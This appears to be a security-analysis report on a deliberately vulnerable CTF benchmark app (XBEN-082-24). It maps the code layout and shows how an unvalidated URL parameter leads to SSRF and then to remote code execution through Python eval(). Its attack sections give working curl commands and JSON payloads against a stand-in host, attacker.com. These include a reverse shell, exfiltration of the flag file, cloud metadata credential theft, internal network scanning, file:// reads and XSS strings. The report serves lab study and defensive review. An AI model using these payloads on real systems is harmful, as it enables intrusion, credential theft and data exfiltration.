### Directory Structure and Organization

The repository follows a **service-oriented directory structure** where each microservice has its own isolated directory containing application code, dependencies, and Docker build configuration:

```
/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/
├── .env                          # Environment variables (FLAG storage)
├── .git/                         # Git version control
├── Makefile                      # Build orchestration
├── benchmark.json                # CTF metadata
├── docker-compose.yml            # Container orchestration
├── nginx/                        # Reverse proxy service
│   ├── Dockerfile                # NGINX container build
│   ├── nginx.conf                # HTTP server configuration
│   ├── conf.d/
│   │   └── helper.js             # NJS JavaScript handlers
│   └── html/
│       ├── index.html            # Static frontend
│       └── script.js             # Frontend JavaScript
├── app/                          # Flask main application
│   ├── Dockerfile                # Flask app container build
│   ├── requirements.txt          # Python dependencies
│   ├── app.py                    # Main Flask application (RCE vulnerability)
│   └── templates/
│       └── index.html            # Jinja2 template
└── api/                          # Flask API service
    ├── Dockerfile                # Flask API container build
    ├── requirements.txt          # Python dependencies
    └── app.py                    # API service
```

**Organizational Patterns:**

1. **Service Isolation:** Each service (nginx, app, api) is completely self-contained with its own Dockerfile, dependencies, and application code. This follows microservices best practices but lacks security boundaries (no network policies, no authentication between services).

2. **Configuration at Root:** Shared infrastructure configuration (`docker-compose.yml`, `.env`, `Makefile`) resides at the repository root, following Docker Compose conventions.

3. **Template Separation:** Flask templates are organized in a `templates/` subdirectory within the `app/` service, following Flask project conventions.

4. **Static Assets in NGINX:** Frontend HTML and JavaScript are served directly from the NGINX container (`nginx/html/`), avoiding unnecessary traffic through the Flask application.

### Build Orchestration and Tooling

**Primary Build System: GNU Make**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/Makefile`

The Makefile serves as the entry point for build operations and includes a common makefile (`../common.mk`) that likely contains shared build logic for multiple CTF challenges:

```makefile
include ../common.mk
```

This inheritance pattern suggests XBEN-082-24 is part of a larger benchmark suite with standardized build processes. The common.mk file (not in scope of this analysis) likely defines:
- Dependency validation (docker, docker-compose, openssl)
- FLAG generation via OpenSSL hashing
- Docker build argument injection
- Build caching controls (`NO_CACHE` environment variable)

**Build Guard Mechanism:**

The presence of `.xben_build_done` (referenced in standard practice) indicates a build guard pattern to prevent redundant builds. This file is created after successful build completion.

**Docker Compose Orchestration:**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/docker-compose.yml`

Docker Compose manages the multi-container architecture with the following configuration:

- **3 services:** nginx, flask_app, flask_api
- **Health checks:** All services implement health check endpoints with Docker health monitoring (1s timeout, 5 retries, 10s interval)
- **Service dependencies:** Services wait for health checks before starting (`condition: service_healthy`)
- **Build contexts:** Each service builds from its respective directory (`./nginx`, `./app`, `./api`)
- **Build-time secrets:** FLAG passed as build argument to flask_app service (insecure - visible in docker history)

**Dependency Management:**

Python dependencies are managed via `requirements.txt` files:

1. **Flask App Dependencies:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/requirements.txt`
   - Flask==3.0.3 (version pinned)
   - requests (NO VERSION PINNING - security risk)

2. **Flask API Dependencies:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/requirements.txt`
   - Flask==3.0.3 (version pinned)

**Security Impact of Build Tooling:**

- **Build-Time Secret Leakage:** FLAG passed as Docker ARG is embedded in image layers, visible via `docker history`
- **Dependency Vulnerability:** Unpinned `requests` library could pull vulnerable versions
- **No Build Security Scanning:** No Trivy, Clair, or Snyk scanning in build process
- **No SBOM Generation:** No Software Bill of Materials created during build

### Code Organization Conventions

**Naming Conventions:**

- **Services:** Lowercase with underscores (`flask_app`, `flask_api`)
- **Files:** Lowercase with hyphens for configs (`docker-compose.yml`), lowercase with underscores for Python (`app.py`)
- **Functions:** Snake_case for Python (`set_api`, `get_script`), camelCase for JavaScript (NJS functions)
- **Constants:** Lowercase for JavaScript variables (`apiURL`, `nameFile`)

**Code Style:**

- **Python:** PEP 8 conventions (4-space indentation, 79-character line limit not enforced)
- **JavaScript:** 4-space indentation, semicolons used inconsistently
- **NGINX Config:** Standard NGINX indentation (4 spaces)

**Testing Framework: NONE DETECTED**

The codebase contains **no test files, test directories, or testing frameworks**. No evidence of:
- Unit tests (pytest, unittest)
- Integration tests
- End-to-end tests
- Security tests (SAST/DAST)

This absence is concerning even for a CTF challenge, as it indicates no validation of intended functionality.

### Security-Relevant Discoverability Issues

**Hidden Security Components:** NONE (overly simplistic architecture)

Unlike production applications with obscured admin panels or hidden debug endpoints, this application's simplicity makes all attack surfaces immediately discoverable:

- **All endpoints visible in NGINX config:** Routes clearly defined in `/nginx/nginx.conf`
- **No authentication obscures endpoints:** Every route is publicly accessible
- **No API versioning:** No `/v1/`, `/v2/` patterns that could hide deprecated endpoints
- **No .well-known or hidden directories:** No obscured configuration endpoints

**Security Controls Discoverability:**

The codebase's structure makes the **absence of security controls** immediately apparent:
- No `auth/` or `middleware/` directories
- No `validators/` or `sanitizers/` modules
- No `security/` configuration directories
- No `secrets/` management modules

**CTF-Specific Markers:**

1. **benchmark.json:** Contains CTF metadata including challenge name (XBEN-082-24) and win condition ("flag")
2. **Canary GUIDs:** Benchmark.json and common.mk contain MAPS/benchmark canary strings indicating training data
3. **FLAG generation:** OpenSSL SHA256 hashing used to generate deterministic flag values
4. **Intentional vulnerabilities:** Code patterns (eval(), unvalidated requests.get()) are deliberately insecure

### Impact on Security Analysis

**Positive Factors for Security Review:**

1. **Small codebase (196 lines):** Enables complete code coverage in security analysis
2. **Clear service boundaries:** Microservices architecture makes attack surface mapping straightforward
3. **No code obfuscation:** Direct, readable code simplifies vulnerability identification
4. **Explicit routing:** NGINX config clearly defines all network entry points

**Negative Factors for Security Review:**

1. **No inline documentation:** No docstrings or comments explaining security assumptions
2. **No security.txt or README:** No documentation of intended security model
3. **No threat model documentation:** No explicit trust boundaries documented
4. **Minimal abstraction:** Direct implementation without security layers makes vulnerabilities obvious but also harder to fix (no middleware injection points)

**Discovery Optimization:**

The codebase structure optimizes for vulnerability discovery in the following order:

1. **Start with NGINX config** (`/nginx/nginx.conf`): Maps all network entry points
2. **Analyze NJS handlers** (`/nginx/conf.d/helper.js`): Identifies input validation (or lack thereof)
3. **Review Flask routes** (`/app/app.py`, `/api/app.py`): Finds dangerous functions (eval, requests.get)
4. **Check Dockerfiles** (`*/Dockerfile`): Discovers secret handling and filesystem permissions
5. **Examine templates** (`/app/templates/index.html`): Identifies output encoding (XSS risks)

This structure, while simple, demonstrates that **architectural security is more important than code volume**. A 196-line codebase with critical vulnerabilities (SSRF, RCE) is more dangerous than a 10,000-line codebase with proper input validation and security controls.

---

## 8. Critical File Paths

All file paths referenced throughout this security analysis are listed below, categorized by their security relevance. These files represent critical starting points for manual security review and penetration testing activities.

### Configuration Files

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/.env`
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/docker-compose.yml`
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/Makefile`
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/benchmark.json`
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf`

### Authentication & Authorization

**STATUS: NO AUTHENTICATION/AUTHORIZATION FILES EXIST**

The application has no authentication or authorization implementation. No session configuration, no login endpoints, no permission validators, and no OAuth/SSO integrations were found. All endpoints are publicly accessible.

Searched locations with no results:
- No `auth/` directory
- No `middleware/` directory for authentication checks
- No session store configuration files
- No OAuth callback handlers

**Session Cookie Configuration: NOT CONFIGURED**

Specifically searched for session cookie flag configuration in:
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py` - No session configuration found
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/app.py` - No session configuration found
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf` - No cookie security directives

### API & Routing

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf` (Lines 14-85: All route definitions)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js` (NJS route handlers)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py` (Flask routes)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/app.py` (Flask API routes)

**API Schemas: NONE FOUND**

No OpenAPI/Swagger, GraphQL schema, or JSON Schema files were discovered in the codebase.

### Data Models & Database Interaction

**STATUS: NO DATABASE IMPLEMENTATION**

The application does not use any database. No database migration files, ORM models, or SQL query files exist.

**Data Storage Mechanisms (Non-Database):**
- `/tmp/name` (inside nginx container) - Stores name parameter (777 permissions)
- `/tmp/apiurl` (inside nginx container) - Stores API URL (777 permissions)
- `/FLAG.txt` (inside flask_app container) - Stores CTF flag (plaintext)

### Dependency Manifests

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/requirements.txt`
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/requirements.txt`

### Sensitive Data & Secrets Handling

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/.env` (Line 1: FLAG in plaintext)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/Dockerfile` (Lines 11-13: FLAG embedding in image)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/docker-compose.yml` (Lines 22-23: FLAG as build arg)

**Encryption & Key Management: NONE IMPLEMENTED**

No encryption libraries, key management systems, or cryptographic implementations found.

### Middleware & Input Validation

**STATUS: NO INPUT VALIDATION OR SECURITY MIDDLEWARE**

The application has no input validation, sanitization, or security middleware.

**Files with dangerous input handling:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js` (Lines 12-21: Unvalidated name parameter)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js` (Lines 39-48: Unvalidated URL parameter)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py` (Lines 9-11: Unvalidated SSRF and eval())

### Logging & Monitoring

**STATUS: NO SECURITY LOGGING OR MONITORING IMPLEMENTATION**

No structured logging, security event logging, or SIEM integration found. Default Flask and NGINX logs only.

### Infrastructure & Deployment

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/docker-compose.yml` (Container orchestration)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/Dockerfile` (NGINX container build)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/Dockerfile` (Flask app container build)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/Dockerfile` (Flask API container build)

**Security Headers Configuration: NONE FOUND**

Specifically searched for infrastructure security headers (HSTS, CSP, X-Frame-Options) in:
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf` - No security headers configured

No Kubernetes Ingress, API Gateway, or CDN configuration files found.

### CTF Flag Storage

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/.env` (Line 1: FLAG environment variable)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/Dockerfile` (Lines 11-13: FLAG written to /FLAG.txt)
- `/FLAG.txt` (inside flask_app container runtime filesystem)

### Frontend & Templates

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/html/index.html` (Static dashboard)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/html/script.js` (Frontend JavaScript)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/templates/index.html` (Jinja2 template with XSS risk)

### Vulnerability-Specific File References

**SSRF Vulnerability:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js` (Lines 39-48: URL injection point)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py` (Line 10: SSRF execution)

**RCE Vulnerability:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py` (Line 11: eval() code execution)

**XSS Vulnerability (Potential):**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/templates/index.html` (Lines 39, 42-43: Template rendering)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js` (Lines 12-21: Name parameter injection)

**File Permission Issues:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/Dockerfile` (Line 7: chmod 777 on config files)

**Debug Mode in Production:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py` (Line 23: debug=True)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/app.py` (Line 19: debug=True)

---

## 9. XSS Sinks and Render Contexts

**Network Surface Analysis:** All XSS sinks identified are in network-accessible web application pages. No sinks found in local-only scripts, build tools, or developer utilities.

### CRITICAL: Server-Side Code Injection via eval()

**Sink Type:** Command Injection - Python eval() with Remote Data

**Render Context:** Server-side Python code execution context

**File Path:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py` (Line 11)

**Code Snippet:**
```python
7  @app.route('/app')
8  def home():
9      api = requests.get('http://nginx/api/get').text
10     script = requests.get(api).text
11     eval_result = eval(json.loads(script)["script"])
12
13     name = requests.get('http://nginx/name/get').text
14
15     return render_template('index.html', api=api, name=name, eval_result=eval_result)
```

**User Input Source:**

The attack chain involves three user-controllable components:

1. **Initial Injection:** Attacker controls API URL via `/api/set?url=<attacker_url>` endpoint
2. **Persistence:** URL stored in `/tmp/apiurl` by NGINX helper.js (line 42-43)
3. **Fetch:** Flask app retrieves attacker-controlled URL (line 9-10)
4. **Execution:** Response JSON's `script` field passed to `eval()` (line 11)

**Data Flow:**
```
User Input: GET /api/set?url=http://evil.com/payload.json
    ↓
NGINX helper.js: fs.writeFileSync('/tmp/apiurl', url)  [NO VALIDATION]
    ↓
Flask app: api = requests.get('http://nginx/api/get').text  [Reads stored URL]
    ↓
Flask app: script = requests.get(api).text  [SSRF - Fetches attacker content]
    ↓
Flask app: eval(json.loads(script)["script"])  [RCE - Executes attacker code]
```

**Exploitability:** **CRITICAL - Trivial to exploit**

**Attack Example:**

Step 1: Set malicious API URL
```bash
curl "http://target/api/set?url=http://attacker.com/evil.json"
```

Step 2: Host malicious JSON payload at attacker.com/evil.json:
```json
{"script": "__import__('os').system('cat /FLAG.txt')"}
```

Step 3: Trigger execution
```bash
curl "http://target/app"
# Server executes Python code, returns flag in response
```

**Advanced Exploitation Examples:**

1. **Reverse Shell:**
```json
{"script": "__import__('os').system('bash -i >& /dev/tcp/attacker.com/4444 0>&1')"}
```

2. **Data Exfiltration:**
```json
{"script": "__import__('urllib.request').urlopen('http://attacker.com/?data=' + open('/FLAG.txt').read()).read()"}
```

3. **File System Exploration:**
```json
{"script": "__import__('subprocess').getoutput('ls -la /')"}
```

**Impact:** Complete server compromise, flag exfiltration, internal network access

---

### HIGH: Template Injection - eval_result Variable

**Sink Type:** XSS/Template Injection - Jinja2 Variable Rendering

**Render Context:** HTML body context (Jinja2 template)

**File Path:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/templates/index.html` (Line 39)

**Code Snippet:**
```html
38  <body>
39      <div class="result">{{ eval_result }}</div>
40      <footer>
41
42          <small>api: {{ api }}</small><br>
43          <small>name: {{ name }}</small>
44      </footer>
```

**User Input Source:**

The `eval_result` variable contains the return value of the `eval()` function (line 11 of app.py), which executes attacker-controlled Python code. If the eval'd code returns a string containing HTML or JavaScript, it will be rendered in the browser.

**Data Flow:**
```
Attacker controls eval() input
    ↓
eval() returns HTML/JavaScript string
    ↓
{{ eval_result }} renders in Jinja2 template
    ↓
Browser executes HTML/JavaScript
```

**Exploitability:** **HIGH** (depends on Jinja2 auto-escaping configuration)

**Attack Example:**

Payload that returns XSS string:
```json
{"script": "'<script>alert(document.cookie)</script>'"}
```

**Jinja2 Auto-Escaping Analysis:**

By default, Jinja2 enables auto-escaping for `.html` file extensions. This means:
- `<` is converted to `&lt;`
- `>` is converted to `&gt;`
- `&` is converted to `&amp;`
- `"` is converted to `&quot;`

**If auto-escaping is enabled (default):** XSS is mitigated, output rendered as text
**If auto-escaping is disabled:** XSS executes in user's browser

**To bypass auto-escaping (if using safe filter):**
```python
# If template uses: {{ eval_result | safe }}
# Then XSS would execute
```

**No evidence of `| safe` filter in template** - Current implementation likely escapes HTML.

**Secondary Attack Vector - SSTI (Server-Side Template Injection):**

If Jinja2 processes the `eval_result` as a template (not just data), attackers could exploit SSTI:

```json
{"script": "'{{ config.items() }}'"}
```

This would leak Flask configuration including secret keys (if configured).

**Impact:** 
- XSS if auto-escaping disabled (cookie theft, session hijacking)
- Information disclosure via SSTI (config leakage)

---

### MEDIUM: Template Injection - api and name Variables

**Sink Type:** XSS - HTML Body Context (Jinja2 auto-escaping may apply)

**Render Context:** HTML body within `<small>` tags

**File Path:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/templates/index.html` (Lines 42-43)

**Code Snippet:**
```html
40      <footer>
41
42          <small>api: {{ api }}</small><br>
43          <small>name: {{ name }}</small>
44      </footer>
```

**User Input Sources:**

1. **For `api` variable:**
   - Controlled via `/api/set?url=<value>` endpoint
   - NGINX handler: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js` (lines 39-48)
   - Stored in `/tmp/apiurl` (world-writable)
   - Retrieved by Flask app and passed to template

2. **For `name` variable:**
   - Controlled via `/name/set?name=<value>` endpoint
   - NGINX handler: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js` (lines 12-21)
   - Stored in `/tmp/name` (world-writable)
   - Retrieved by Flask app and passed to template

**Data Flow:**
```
User Input: GET /api/set?url=<script>alert(1)</script>
    ↓
NGINX helper.js: fs.writeFileSync('/tmp/apiurl', url)  [NO VALIDATION]
    ↓
Flask app: api = requests.get('http://nginx/api/get').text
    ↓
Template rendering: {{ api }}  [Auto-escaping applies]
    ↓
Browser renders escaped HTML (if auto-escaping enabled)
```

**Exploitability:** **MEDIUM** (depends on Jinja2 auto-escaping configuration)

**Attack Example (if auto-escaping disabled):**

Set malicious URL:
```bash
curl "http://target/api/set?url=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
```

Visit /app endpoint:
```bash
curl "http://target/app"
# If auto-escaping disabled, XSS executes
```

Set malicious name:
```bash
curl "http://target/name/set?name=%3Cimg%20src=x%20onerror=alert(1)%3E"
```

**Jinja2 Auto-Escaping Protection:**

Jinja2 auto-escaping is **enabled by default** for `.html` templates. The template file is located at:
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/templates/index.html`

Since it has an `.html` extension and no explicit `autoescape=False` configuration was found in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py`, auto-escaping is **likely active**.

**Impact:**
- **If auto-escaping enabled (likely):** Low risk - HTML rendered as text
- **If auto-escaping disabled:** High risk - XSS with cookie theft, session hijacking

**Verification Required:**

To confirm auto-escaping status, check Flask app initialization:
```python
# In app.py, check for:
app = Flask(__name__)
# Default: auto-escaping ON

# If this exists, auto-escaping is disabled:
app.jinja_env.autoescape = False  # NOT FOUND in current code
```

**Current assessment:** Auto-escaping likely enabled, XSS risk LOW unless explicitly disabled.

---

### XSS Sinks NOT FOUND

The following dangerous XSS sink categories were searched but **not found** in network-accessible code:

#### JavaScript Context Sinks: NONE

**Searched for:**
- `eval()` in JavaScript contexts
- `Function()` constructor
- `setTimeout()/setInterval()` with string arguments
- Direct user data in `<script>` tags

**Analysis of JavaScript file:**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/html/script.js`

**Safe DOM methods detected:**
```javascript
4  document.getElementById('name').textContent = json.name;  // SAFE - textContent doesn't parse HTML
11 document.getElementById('result').textContent = json.result;  // SAFE
```

**No dangerous sinks found:**
- ❌ No `innerHTML` usage
- ❌ No `eval()` calls
- ❌ No `document.write()`
- ❌ No `insertAdjacentHTML()`

**Conclusion:** Frontend JavaScript uses safe DOM manipulation methods.

#### SQL Injection: NOT APPLICABLE

**Status:** No database exists, therefore no SQL injection sinks.

**Search Results:**
- No `cursor.execute()` calls
- No raw SQL query construction
- No ORM queries with string concatenation
- No database client libraries imported

#### Command Injection (subprocess/shell): NOT FOUND (Beyond Python eval)

**Searched for:**
- `os.system()`
- `os.popen()`
- `subprocess.call()`, `subprocess.run()`, `subprocess.Popen()`
- Shell command construction with user input

**Note:** The Python `eval()` vulnerability (documented above) can be leveraged for command injection:
```python
eval("__import__('os').system('whoami')")
```

This provides equivalent command execution capabilities.

#### Client-Side Template Injection: NONE

**Status:** No client-side template engines detected.

**Searched for:**
- Vue.js templates (`{{ }}`, `v-html`)
- Angular templates (`{{ }}`, `[innerHTML]`)
- React dangerouslySetInnerHTML
- Handlebars, Mustache templates

**Conclusion:** Application uses server-side rendering only (Jinja2), no client-side template frameworks.

#### Event Handler XSS: NONE

**Status:** No dynamic event handler assignment found.

**Searched for:**
- `element.onclick = ...`
- `element.onerror = ...`
- `setAttribute('onclick', ...)`
- `addEventListener()` with user-controlled data

**Conclusion:** No dynamic event handler manipulation in JavaScript code.

#### URL Manipulation XSS: NONE

**Status:** No dangerous URL manipulation found.

**Searched for:**
- `location.href = userInput`
- `window.open(userInput)`
- `history.pushState()` with user input
- `location.replace()` with user input

**Conclusion:** No URL manipulation with user-controlled data.

---

### Network Accessibility Verification

All identified XSS/injection sinks are in **network-accessible code paths**:

1. **eval() Sink (Line 11 of app.py):** 
   - Accessible via `http://target/app` 
   - Proxied through NGINX on port 80
   - No authentication required

2. **Template Rendering (Lines 39, 42-43 of index.html):**
   - Rendered when `/app` endpoint is accessed
   - Network-triggered via HTTP GET request

**Excluded from Analysis (Out of Scope):**

- `.git/hooks/*` - Git hooks (local-only developer tools)
- `Makefile`, `docker-compose.yml` - Build configuration (not network-accessible)
- Dockerfile `RUN` commands - Build-time only, not runtime

---

### Severity Summary

| Sink ID | Sink Type | Severity | CVSS | Network Accessible | Exploitability |
|---------|-----------|----------|------|-------------------|----------------|
| 1 | Python eval() RCE | **CRITICAL** | 10.0 | ✅ Yes (via /app) | Trivial |
| 2 | Template injection (eval_result) | **HIGH** | 7.5 | ✅ Yes (via /app) | Medium (depends on config) |
| 3 | XSS via api/name params | **MEDIUM** | 6.1 | ✅ Yes (via /app) | Low (auto-escaping likely enabled) |

**Total XSS/Injection Sinks Found:** 3 (1 Critical, 1 High, 1 Medium)

---

## 10. SSRF Sinks

**Network Surface Analysis:** All SSRF sinks identified are in network-accessible web application endpoints. No sinks found in local-only utilities, build scripts, or CLI applications.

### CRITICAL: Server-Side Request Forgery via Unvalidated URL Parameter

**Sink Type:** HTTP Client - Python requests.get() with User-Controlled URL

**File Path:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py` (Line 10)

**Code Snippet:**
```python
7  @app.route('/app')
8  def home():
9      api = requests.get('http://nginx/api/get').text
10     script = requests.get(api).text  # SSRF SINK - No URL validation
11     eval_result = eval(json.loads(script)["script"])
12
13     name = requests.get('http://nginx/name/get').text
14
15     return render_template('index.html', api=api, name=name, eval_result=eval_result)
```

**User Input Parameter:**

The SSRF vulnerability is triggered through a **two-step attack chain**:

1. **Configuration Injection:** Attacker sets malicious URL via `/api/set?url=<attacker_controlled_url>`
2. **Persistence:** URL stored in `/tmp/apiurl` by NGINX helper.js
3. **Retrieval:** Flask app fetches stored URL from NGINX (line 9)
4. **SSRF Execution:** Flask app makes HTTP request to attacker-controlled destination (line 10)

**URL Storage Handler:**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js` (Lines 39-48)

```javascript
function set_api(r) {
    let args = r.args;
    if (args.url) {
        apiURL = args.url;  // NO VALIDATION - accepts any string
        fs.writeFileSync(apiURLFile, apiURL);
        r.return(200, "API URL set to: " + apiURL);
    } else {
        r.return(400, "Missing 'url' parameter");
    }
}
```

**Validation Present:** **NONE**

The application performs **ZERO validation** on the URL parameter:

- ❌ No URL format validation (accepts any string)
- ❌ No protocol allow-listing (accepts http://, https://, file://, gopher://, etc.)
- ❌ No hostname allow-listing
- ❌ No IP address validation
- ❌ No internal IP range blocking (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8)
- ❌ No cloud metadata endpoint blocking (169.254.169.254)
- ❌ No port restrictions
- ❌ No redirect following limits
- ❌ No timeout configuration
- ❌ No response size limits

**Attack Vector:**

**Basic SSRF Attack:**
```bash
# Step 1: Set malicious URL pointing to internal service
curl "http://target/api/set?url=http://flask_api:8081/script"

# Step 2: Trigger SSRF
curl "http://target/app"
# Server fetches from internal flask_api service
```

**Advanced Attack Scenarios:**

**1. Cloud Metadata Theft (AWS):**
```bash
curl "http://target/api/set?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "http://target/app"
# Server returns AWS IAM credentials in response
```

**2. Cloud Metadata Theft (GCP):**
```bash
curl "http://target/api/set?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Add header: Metadata-Flavor: Google (requires requests modification)
```

**3. Internal Network Scanning:**
```bash
# Port scanning internal network
for port in 22 80 443 3306 5432 6379 8080 8081; do
  curl "http://target/api/set?url=http://192.168.1.1:${port}/"
  curl "http://target/app"
  # Response reveals open ports
done
```

**4. File Protocol Exploitation:**
```bash
curl "http://target/api/set?url=file:///etc/passwd"
curl "http://target/app"
# If requests library supports file://, reads local files
```

**5. SSRF + RCE Chain (Primary Attack):**
```bash
# Host malicious payload at attacker.com/evil.json:
# {"script": "__import__('os').system('cat /FLAG.txt')"}

curl "http://target/api/set?url=http://attacker.com/evil.json"
curl "http://target/app"
# Server fetches payload and executes via eval() → Full RCE
```

**6. DNS Rebinding Attack:**
```bash
# Register domain attacker.com with short TTL
# Initial DNS response: 93.184.216.34 (external IP, passes initial checks)
# After fetch: DNS response changes to 192.168.1.1 (internal IP)
curl "http://target/api/set?url=http://attacker.com/payload"
curl "http://target/app"
# Bypasses IP-based filters (if they existed)
```

---

### Internal Network Risk

**Can this reach internal services?** ✅ **YES - CRITICAL RISK**

**Docker Internal Network Architecture:**

The application runs in a Docker Compose network where all three services share an internal network:

- **nginx** container (172.x.x.2)
- **flask_app** container (172.x.x.3) - **SSRF vulnerable**
- **flask_api** container (172.x.x.4)

**Service Discovery via Docker DNS:**

Docker provides internal DNS at 127.0.0.11 with service name resolution:
- `http://nginx` → nginx container
- `http://flask_app:8080` → flask_app container
- `http://flask_api:8081` → flask_api container

**Accessible Internal Endpoints:**

1. **NGINX Internal Endpoints:**
   - `http://nginx/api/get` (returns stored API URL)
   - `http://nginx/api/set` (modifies API URL - SSRF can change its own target)
   - `http://nginx/name/get` (returns stored name)
   - `http://nginx/name/set` (modifies name parameter)
   - `http://nginx/healthcheck`

2. **Flask API Internal Endpoints:**
   - `http://flask_api:8081/` (API welcome message)
   - `http://flask_api:8081/script` (returns benign script by default)
   - `http://flask_api:8081/healthcheck`

3. **Flask App Internal Endpoints (Self-SSRF):**
   - `http://flask_app:8080/app` (can trigger recursive SSRF)
   - `http://flask_app:8080/healthcheck`

**Attack Example - Internal Service Access:**
```bash
# Access internal API that's not exposed externally
curl "http://target/api/set?url=http://flask_api:8081/"
curl "http://target/app"
# Returns: {"message": "Welcome to the API! Please check /script endpoint..."}
```

**Internal Network Reconnaissance:**

The SSRF can be used to map the internal Docker network:
```bash
# Enumerate Docker subnet (typically 172.17.0.0/16 or 172.18.0.0/16)
for i in {1..254}; do
  curl "http://target/api/set?url=http://172.17.0.${i}:8080/"
  response=$(curl "http://target/app")
  if [[ $response != *"error"* ]]; then
    echo "Live host: 172.17.0.${i}"
  fi
done
```

---

### Cloud Metadata Risk

**Can this reach 169.254.169.254 or metadata endpoints?** ✅ **YES - CRITICAL RISK**

**AWS Metadata API:**

```bash
# Retrieve IAM credentials
curl "http://target/api/set?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "http://target/app"
# Returns: role name (e.g., "ec2-role")

# Retrieve credentials for role
curl "http://target/api/set?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"
curl "http://target/app"
# Returns: AccessKeyId, SecretAccessKey, Token
```

**GCP Metadata API:**

```bash
# Retrieve access token
curl "http://target/api/set?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Note: GCP requires "Metadata-Flavor: Google" header (requires requests modification)
```

**Azure Metadata API:**

```bash
# Retrieve instance metadata
curl "http://target/api/set?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
# Note: Azure requires "Metadata: true" header
```

**Exploitation Impact:**

If the application is deployed on cloud infrastructure (AWS, GCP, Azure):

1. **Credential Theft:** Attacker retrieves cloud service credentials
2. **Privilege Escalation:** Uses credentials to access cloud resources (S3 buckets, databases, VMs)
3. **Lateral Movement:** Compromises other cloud resources using stolen credentials
4. **Data Exfiltration:** Accesses sensitive data stored in cloud services

**Current Environment:**

The application is a CTF challenge running in local Docker containers, so cloud metadata endpoints are **not accessible in this deployment**. However, if deployed to AWS/GCP/Azure, this vulnerability would enable cloud credential theft.

---

### Attack Vector Summary

**Complete SSRF Exploitation Chain:**

```
External Attacker
    ↓
GET /api/set?url=http://169.254.169.254/latest/meta-data/
    ↓
NGINX helper.js (Lines 39-48)
  - Accepts URL without validation
  - Writes to /tmp/apiurl (777 permissions)
    ↓
